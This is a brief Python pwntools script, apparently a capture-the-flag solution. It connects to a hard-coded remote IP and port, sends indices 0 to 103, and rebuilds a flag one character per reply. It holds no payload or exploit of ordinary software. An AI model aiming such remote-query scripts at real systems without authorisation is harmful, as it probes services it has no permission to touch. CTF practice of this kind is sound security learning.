import pwn

server = pwn.remote('94.237.58.148', 50116)
flag = ""


for integ in range(0,104):
    server.sendline(str(integ))
    char = server.recvline()
    char = char.decode("utf-8")
    flag += char[-2]
print(flag)